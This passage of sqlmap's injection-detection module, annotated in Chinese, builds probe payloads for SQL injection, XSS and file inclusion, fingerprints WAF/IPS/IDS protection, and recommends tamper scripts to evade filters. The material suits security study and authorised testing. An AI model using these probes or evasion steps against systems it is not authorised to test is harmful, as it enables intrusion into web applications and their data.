            warnMsg = "检测到误报或不可利用的注入点"
            logger.warn(warnMsg)

        kb.injection = popValue()

    return retVal

def checkSuhosinPatch(injection):
    """
    检查是否存在类似Suhosin-patch的保护机制
    Suhosin是一个PHP程序的保护系统。
    它的设计初衷是为了保护服务器和用户抵御PHP程序和PHP核心中，已知或者未知的缺陷。 
    Suhosin有两个独立的部分，使用时可以分开使用或者联合使用。 
    第一部分是一个用于PHP核心的补丁，它能抵御缓冲区溢出或者格式化串的弱点； 
    第二部分是一个强大的PHP扩展，包含其他所有的保护措施。
    """

    if injection.place == PLACE.GET:
        debugMsg = u"检查参数长度约束机制"
        logger.debug(debugMsg)

        pushValue(kb.injection)

        kb.injection = injection
        randInt = randomInt()

        if not checkBooleanExpression("%d=%s%d" % (randInt, ' ' * SUHOSIN_MAX_VALUE_LENGTH, randInt)):
            warnMsg = u"检测到参数长度约束机制(例如Suhosin保护补丁)"
            warnMsg += u"在枚举阶段可以预期潜在的问题"
            logger.warn(warnMsg)

        kb.injection = popValue()

def checkFilteredChars(injection):
    debugMsg = u"检查过滤字符"
    logger.debug(debugMsg)

    pushValue(kb.injection)

    kb.injection = injection
    randInt = randomInt()

    # 所有其他技术已经在测试中使用括号
    if len(injection.data) == 1 and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:
        if not checkBooleanExpression("(%d)=%d" % (randInt, randInt)):
            warnMsg = "似乎有些非字母数字字符(即括号 () )被后端服务器过滤。"
            warnMsg += "sqlmap 将无法正确利用此漏洞"
            logger.warn(warnMsg)

    # 推理技术取决于字符'>'
    if not any(_ in injection.data for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.QUERY)):
        if not checkBooleanExpression("%d>%d" % (randInt+1, randInt)):
            warnMsg = "字符'>'似乎被后端服务器过滤。"
            warnMsg += "强烈建议您重新运行'--tamper=between'"
            logger.warn(warnMsg)

    kb.injection = popValue()
# place：请求的方法类型GET，注入位置； parameter："index.php?id=1"注入参数id
def heuristicCheckSqlInjection(place, parameter):
    if kb.nullConnection:
        debugMsg = "由于使用了 NULL 连接, 启发式检查被跳过"
        logger.debug(debugMsg)
        return None
    # origValue中保存了"index.php?id=1"中id的值'1'
    origValue = conf.paramDict[place][parameter]
    # paramType = 'GET'
    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place

    prefix = ""
    suffix = ""
    randStr = ""

    if conf.prefix or conf.suffix:
        if conf.prefix:
            prefix = conf.prefix

        if conf.suffix:
            suffix = conf.suffix

    while randStr.count('\'') != 1 or randStr.count('\"') != 1:
        # 用于启发式检查的字母
        # HEURISTIC_CHECK_ALPHABET = ('"', '\'', ')', '(', ',', '.')
        randStr = randomStr(length=10, alphabet=HEURISTIC_CHECK_ALPHABET)

    kb.heuristicMode = True
    # 如果没有提供prefix, suffix, 则payload为randStr生成的随机字符')",))(\\').,'
    payload = "%s%s%s" % (prefix, randStr, suffix)
    payload = agent.payload(place, parameter, newValue=payload)
    page, _, _ = Request.queryPage(payload, place, content=True, raise404=False)
    # page保存了注入页面的内容
    kb.heuristicPage = page
    kb.heuristicMode = False

    parseFilePaths(page)
    result = wasLastResponseDBMSError() #如果最后一个Web请求导致（已识别）DBMS错误页面，则返回True

    infoMsg = u"启发式测试显示%s参数'%s'可能是" % (paramType, parameter)

    def _(page):
        # 检测页面中是否存在FORMAT_EXCEPTION_STRINGS中定义的出错信息
        # 用于检测格式错误的字符串
        # FORMAT_EXCEPTION_STRINGS里面定义了一些出错信息
        # 例如："Type mismatch", "Error converting"等
        return any(_ in (page or "") for _ in FORMAT_EXCEPTION_STRINGS) # 页面出错返回True

    # casting是一个布尔类型，kb.originalPage原始页面永为真，不出错返回False，not False 为真
    # 如果注入页面出错返回真，True and not False返回True
    # casting为真
    casting = _(page) and not _(kb.originalPage)  # kb.originalPage = None

    # 如果casting和result为假，kb.dynamicParameter参数是动态的，原始值是数字型的
    if not casting and not result and kb.dynamicParameter and origValue.isdigit():
        randInt = int(randomInt())
        payload = "%s%s%s" % (prefix, "%d-%d" % (int(origValue) + randInt, randInt), suffix)
        payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE)
        result = Request.queryPage(payload, place, raise404=False)

        if not result:
            randStr = randomStr()
            payload = "%s%s%s" % (prefix, "%s.%d%s" % (origValue, random.randint(1, 9), randStr), suffix)
            payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE)
            casting = Request.queryPage(payload, place, raise404=False)

    kb.heuristicTest = HEURISTIC_TEST.CASTED if casting else HEURISTIC_TEST.NEGATIVE if not result else HEURISTIC_TEST.POSITIVE

    if casting:
        errMsg = u"后端Web应用程序检测到可能存在'%s'转换" % ("integer" if origValue.isdigit() else "type")
        errMsg += u"(例如 \"$%s=intval($_REQUEST['%s'])\") " % (parameter, parameter)
        logger.error(errMsg)

        if kb.ignoreCasted is None:
            message = u"你想跳过这种情况(并保存扫描时间)? %s " % ("[Y/n]" if conf.multipleTargets else "[y/N]")
            kb.ignoreCasted = readInput(message, default='Y' if conf.multipleTargets else 'N', boolean=True)

    elif result:
        infoMsg += u"可注入的"
        if Backend.getErrorParsedDBMSes():
            infoMsg += u" (可能的DBMS: '%s')" % Format.getErrorParsedDBMSes()
        logger.info(infoMsg)

    else:
        infoMsg += u"不可注入的"
        logger.warn(infoMsg)

    kb.heuristicMode = True

    # 在非SQLI启发式检查中使用的前缀和后缀长度
    # NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH = 6
    randStr1, randStr2 = randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH), randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH)
    # 用于虚拟非SQLi（例如XSS）启发式检查测试参数值的字符串
    # DUMMY_NON_SQLI_CHECK_APPENDIX = "<'\">"
    value = "%s%s%s" % (randStr1, DUMMY_NON_SQLI_CHECK_APPENDIX, randStr2)
    payload = "%s%s%s" % (prefix, "'%s" % value, suffix)
    payload = agent.payload(place, parameter, newValue=payload)
    page, _, _ = Request.queryPage(payload, place, content=True, raise404=False)

    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place

    if value.lower() in (page or "").lower():
        infoMsg = u"启发式(XSS)测试显示%s参数" % paramType
        infoMsg += u"'%s'可能容易受到跨站点脚本攻击" % parameter
        logger.info(infoMsg)

    # 用于识别文件包含错误的正则表达式
    # FI_ERROR_REGEX = "(?i)[^\n]{0,100}(no such file|failed (to )?open)[^\n]{0,100}"
    for match in re.finditer(FI_ERROR_REGEX, page or ""):
        if randStr1.lower() in match.group(0).lower():
            infoMsg = u"启发式（FI）测试显示%s参数" % paramType
            infoMsg += u"'%s'可能容易受到文件包含攻击" % parameter
            logger.info(infoMsg)
            break

    kb.heuristicMode = False

    return kb.heuristicTest

def checkDynParam(place, parameter, value):
    """
    此函数检查URL参数是否是动态的。 
    如果它是动态的，则页面的内容不同，否则动态性可能取决于另一个参数。
    """

    if kb.redirectChoice:
        return None

    kb.matchRatio = None
    dynResult = None
    randInt = randomInt()

    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place

    infoMsg = u"测试%s参数'%s'是否是动态的"% (paramType, parameter)
    logger.info(infoMsg)

    try:
        payload = agent.payload(place, parameter, value, getUnicode(randInt))
        dynResult = Request.queryPage(payload, place, raise404=False)

        if not dynResult:
            infoMsg = u"确认%s参数'%s'是动态的" % (paramType, parameter)
            logger.info(infoMsg)

            randInt = randomInt()
            payload = agent.payload(place, parameter, value, getUnicode(randInt))
            dynResult = Request.queryPage(payload, place, raise404=False)
    except SqlmapConnectionException:
        pass

    result = None if dynResult is None else not dynResult
    kb.dynamicParameter = result

    return result

def checkDynamicContent(firstPage, secondPage):
    """
    此函数检查所提供页面中的动态内容
    """

    if kb.nullConnection:
        debugMsg = "由于使用NULL连接，因此跳过动态内容检查"
        logger.debug(debugMsg)
        return

    if any(page is None for page in (firstPage, secondPage)):
        warnMsg = "由于缺乏页面内容，无法检查动态内容"
        logger.critical(warnMsg)
        return

    if firstPage and secondPage and any(len(_) > MAX_DIFFLIB_SEQUENCE_LENGTH for _ in (firstPage, secondPage)):
        ratio = None
    else:
        try:
            seqMatcher = getCurrentThreadData().seqMatcher
            seqMatcher.set_seq1(firstPage)
            seqMatcher.set_seq2(secondPage)
            ratio = seqMatcher.quick_ratio()
        except MemoryError:
            ratio = None

    if ratio is None:
        kb.skipSeqMatcher = True

    # In case of an intolerable difference turn on dynamicity removal engine
    elif ratio <= UPPER_RATIO_BOUND:
        findDynamicContent(firstPage, secondPage)

        count = 0
        while not Request.queryPage():
            count += 1

            if count > conf.retries:
                warnMsg = "target URL is too dynamic. "
                warnMsg += "Switching to '--text-only' "
                logger.warn(warnMsg)

                conf.textOnly = True
                return

            warnMsg = u"目标网址是动态的，sqlmap将重试该请求"
            logger.critical(warnMsg)

            secondPage, _, _ = Request.queryPage(content=True)
            findDynamicContent(firstPage, secondPage)

def checkStability():
    """
    该功能检查URL内容是否稳定，请求相同的页面两次，在每个请求中以较小的延迟假定它是稳定的。

    如果请求同一页面的页面内容不同，则动态性可能取决于其他参数，例如字符串匹配（--string）。
    """

    infoMsg = u"测试目标网址是否稳定"
    logger.info(infoMsg)

    firstPage = kb.originalPage  # set inside checkConnection()

    delay = 1 - (time.time() - (kb.originalPageTime or 0))
    delay = max(0, min(1, delay))
    time.sleep(delay)

    secondPage, _, _ = Request.queryPage(content=True, noteResponseTime=False, raise404=False)

    if kb.redirectChoice:
        return None

    kb.pageStable = (firstPage == secondPage)

    if kb.pageStable:
        if firstPage:
            infoMsg = u"目标网址稳定"
            logger.info(infoMsg)
        else:
            errMsg = u"由于缺少内容, 检查页面的稳定性时出错，"
            errMsg += u"请通过提高检测的详细程度等级，来查看页面请求的结果(和可能的错误)"
            logger.error(errMsg)

    else:
        warnMsg = u"目标网址不稳定，sqlmap将基于序列匹配对页面进行比较，"
        warnMsg += u"如果没有检测到动态或可注入的参数，或者出现垃圾结果时，"
        warnMsg += u"请参考用户手册段落页面比较，并提供一个字符串或正则表达式来匹配"
        logger.warn(warnMsg)

        message = u"你想如何进行? [(C)ontinue/(s)tring/(r)egex/(q)uit] "
        choice = readInput(message, default='C').upper()

        if choice == 'Q':
            raise SqlmapUserQuitException

        elif choice == 'S':
            showStaticWords(firstPage, secondPage)

            message = u"请输入参数'string'的值: "
            string = readInput(message)

            if string:
                conf.string = string

                if kb.nullConnection:
                    debugMsg = u"由于字符串检查，关闭NULL连接支持"
                    logger.debug(debugMsg)

                    kb.nullConnection = None
            else:
                errMsg = u"提供的值是空的"
                raise SqlmapNoneDataException(errMsg)

        elif choice == 'R':
            message = "请输入参数'regex'的值: "
            regex = readInput(message)

            if regex:
                conf.regex = regex

                if kb.nullConnection:
                    debugMsg = u"由于正则表达式检查，关闭NULL连接支持"
                    logger.debug(debugMsg)

                    kb.nullConnection = None
            else:
                errMsg = u"提供的值是空的"
                raise SqlmapNoneDataException(errMsg)

        else:
            checkDynamicContent(firstPage, secondPage)

    return kb.pageStable

def checkString():
    if not conf.string:
        return True

    infoMsg = u"测试提供的字符串是否在目标URL页面内容中"
    logger.info(infoMsg)

    page, headers, _ = Request.queryPage(content=True)
    rawResponse = "%s%s" % (listToStrValue(headers.headers if headers else ""), page)

    if conf.string not in rawResponse:
        warnMsg = u"您提供'%s'作为匹配的字符串" % conf.string
        warnMsg += u"但该字符串不在目标URL原始响应页面内容中，"
        warnMsg += u"sqlmap将继续执行"
        logger.warn(warnMsg)

    return True

def checkRegexp():
    if not conf.regexp:
        return True

    infoMsg = u"测试提供的正则表达式是否匹配目标URL页面内容"
    logger.info(infoMsg)

    page, headers, _ = Request.queryPage(content=True)
    rawResponse = "%s%s" % (listToStrValue(headers.headers if headers else ""), page)

    if not re.search(conf.regexp, rawResponse, re.I | re.M):
        warnMsg = u"您提供'%s'作为匹配的正则表达式，" % conf.regexp
        warnMsg += u"但该正则表达式匹配的内容在目标URL原始响应页面中没有任何与之匹配"
        warnMsg += u"sqlmap将继续执行"
        logger.warn(warnMsg)

    return True

def checkWaf():
    """
    检测防火墙
    Reference: http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse
    """

    if any((conf.string, conf.notString, conf.regexp, conf.dummy, conf.offline, conf.skipWaf)):
        return None

    _ = hashDBRetrieve(HASHDB_KEYS.CHECK_WAF_RESULT, True)
    if _ is not None:
        if _:
            warnMsg = u"以前的启发式检测发现目标受到某种WAF/IPS/IDS的保护"
            logger.critical(warnMsg)
        return _

    infoMsg = u"检查目标是否受到某种WAF/IPS/IDS的保护"
    logger.info(infoMsg)

    retVal = False
    payload = "%d %s" % (randomInt(), IDS_WAF_CHECK_PAYLOAD)

    value = "" if not conf.parameters.get(PLACE.GET) else conf.parameters[PLACE.GET] + DEFAULT_GET_POST_DELIMITER
    value += agent.addPayloadDelimiters("%s=%s" % (randomStr(), payload))

    pushValue(conf.timeout)
    conf.timeout = IDS_WAF_CHECK_TIMEOUT

    try:
        retVal = Request.queryPage(place=PLACE.GET, value=value, getRatioValue=True, noteResponseTime=False, silent=True)[1] < IDS_WAF_CHECK_RATIO
    except SqlmapConnectionException:
        retVal = True
    finally:
        kb.matchRatio = None
        conf.timeout = popValue()

    if retVal:
        warnMsg = u"启发式检测发现目标受到某种WAF/IPS/IDS的保护"
        logger.critical(warnMsg)

        if not conf.identifyWaf:
            message = u"你想要sqlmap尝试检测后端WAF/IPS/IDS吗? [y/N] "

            if readInput(message, default='N', boolean=True):
                conf.identifyWaf = True

        if conf.timeout == defaults.timeout:
            logger.warning(u"将超时延迟到%d秒(即 '--timeout=%d')" % (IDS_WAF_CHECK_TIMEOUT, IDS_WAF_CHECK_TIMEOUT))
            conf.timeout = IDS_WAF_CHECK_TIMEOUT

    hashDBWrite(HASHDB_KEYS.CHECK_WAF_RESULT, retVal, True)

    return retVal

def identifyWaf():
    if not conf.identifyWaf:
        return None

    if not kb.wafFunctions:
        setWafFunctions()

    kb.testMode = True

    infoMsg = u"使用WAF脚本检测后端WAF/IPS/IDS保护"
    logger.info(infoMsg)

    @cachedmethod
    def _(*args, **kwargs):
        page, headers, code = None, None, None
        try:
            pushValue(kb.redirectChoice)
            kb.redirectChoice = REDIRECTION.NO
            if kwargs.get("get"):
                kwargs["get"] = urlencode(kwargs["get"])
            kwargs["raise404"] = False
            kwargs["silent"] = True
            page, headers, code = Request.getPage(*args, **kwargs)
        except Exception:
            pass
        finally:
            kb.redirectChoice = popValue()
        return page or "", headers or {}, code

    retVal = []

    for function, product in kb.wafFunctions:
        try:
            logger.debug(u"检查WAF/IPS/IDS防护产品'%s'" % product)
            found = function(_)
        except Exception, ex:
            errMsg = u"运行'%s'的WAF脚本时出现异常('%s')" % (product, getSafeExString(ex))
            logger.critical(errMsg)

            found = False

        if found:
            errMsg = u"WAF/IPS/IDS识别为'%s'" % product
            logger.critical(errMsg)

            retVal.append(product)

    if retVal:
        message = u"您确定要继续进行进一步的目标测试? [y/N] "
        choice = readInput(message, default='N', boolean=True)

        if not conf.tamper:
            warnMsg = u"请考虑使用篡改脚本(option '--tamper')"
            singleTimeWarnMessage(warnMsg)

        if not choice:
            raise SqlmapUserQuitException
    else:
        warnMsg = u"WAF/IPS/IDS尚未确定"
        logger.warn(warnMsg)

    kb.testType = None
    kb.testMode = False

    return retVal

def checkNullConnection():
    """
    Reference: http://www.wisec.it/sectou.php?id=472f952d79293
    """

    if conf.data:
        return False

    infoMsg = u"测试与目标URL的NULL连接"
    logger.info(infoMsg)

    try:
        pushValue(kb.pageCompress)
        kb.pageCompress = False

        page, headers, _ = Request.getPage(method=HTTPMETHOD.HEAD)

        if not page and HTTP_HEADER.CONTENT_LENGTH in (headers or {}):
            kb.nullConnection = NULLCONNECTION.HEAD

            infoMsg = u"HEAD方法支持NULL连接(内容长度)"
            logger.info(infoMsg)
        else:
            page, headers, _ = Request.getPage(auxHeaders={HTTP_HEADER.RANGE: "bytes=-1"})

            if page and len(page) == 1 and HTTP_HEADER.CONTENT_RANGE in (headers or {}):
                kb.nullConnection = NULLCONNECTION.RANGE

                infoMsg = u"GET方法支持NULL连接(范围)"
                infoMsg += "'%s'" % kb.nullConnection
                logger.info(infoMsg)
            else:
                _, headers, _ = Request.getPage(skipRead = True)

                if HTTP_HEADER.CONTENT_LENGTH in (headers or {}):
                    kb.nullConnection = NULLCONNECTION.SKIP_READ

                    infoMsg = u"skip-read方法支持NULL连接"
                    logger.info(infoMsg)

    except SqlmapConnectionException, ex:
        errMsg = getSafeExString(ex)
        raise SqlmapConnectionException(errMsg)

    finally:
        kb.pageCompress = popValue()

    return kb.nullConnection is not None

def checkConnection(suppressOutput=False):
    if not any((conf.proxy, conf.tor, conf.dummy, conf.offline)):
        try:
            debugMsg = u"解析主机名'%s'" % conf.hostname
            logger.debug(debugMsg)
            socket.getaddrinfo(conf.hostname, None)
        except socket.gaierror:
            errMsg = u"主机'%s'不存在" % conf.hostname
            raise SqlmapConnectionException(errMsg)
        except socket.error, ex:
            errMsg = u"解析主机名'%s'时出现问题('%s')" % (conf.hostname, getSafeExString(ex))
            raise SqlmapConnectionException(errMsg)

    if not suppressOutput and not conf.dummy and not conf.offline:
        infoMsg = u"测试与目标URL的连接"
        logger.info(infoMsg)

    try:
        kb.originalPageTime = time.time()
        page, headers, _ = Request.queryPage(content=True, noteResponseTime=False)
        kb.originalPage = kb.pageTemplate = page

        kb.errorIsNone = False

        if not kb.originalPage and wasLastResponseHTTPError():
            errMsg = u"无法检索页面内容"
            raise SqlmapConnectionException(errMsg)
        elif wasLastResponseDBMSError():
            warnMsg = u"在HTTP响应主体中存在可能会干扰测试结果的DBMS错误"
            logger.warn(warnMsg)
        elif wasLastResponseHTTPError():
            warnMsg = u"Web服务器使用HTTP错误代码(%d)进行响应，这可能会干扰测试结果" % getLastRequestHTTPError()
            logger.warn(warnMsg)
        else:
            kb.errorIsNone = True

    except SqlmapConnectionException, ex:
        if conf.ipv6:
            warnMsg = u"在运行sqlmap之前，请使用ping6 (例如 'ping6 -I eth0 %s') " % conf.hostname
            warnMsg += u"等工具检查与提供的IPv6地址的连接，以避免发生任何寻址问题"
            singleTimeWarnMessage(warnMsg)

        if any(code in kb.httpErrorCodes for code in (httplib.NOT_FOUND, )):
            errMsg = getSafeExString(ex)
            logger.critical(errMsg)

            if conf.multipleTargets:
                return False

            msg = u"不建议在这种情况下继续，你想退出并确保一切都正确设置? [Y/n] "
            if readInput(msg, default='Y', boolean=True):
                raise SqlmapSilentQuitException
            else:
                kb.ignoreNotFound = True
        else:
            raise

    return True

# 使用--check-internet检查Internet连接的通用地址
# CHECK_INTERNET_ADDRESS = "http://ipinfo.io/"
def checkInternet():
    content = Request.getPage(url=CHECK_INTERNET_ADDRESS, checking=True)[0]
    return CHECK_INTERNET_VALUE in (content or "")

# 在对checkinternet地址的响应中寻找值
# CHECK_INTERNET_VALUE = "IP Address Details"
# ipinfo.io页面标题中返回"IP Address Details"
# <title>IP Address Details - ipinfo.io</title>

def setVerbosity():  # Cross-linked function
    raise NotImplementedError

def setWafFunctions():  # Cross-linked function
    raise NotImplementedError
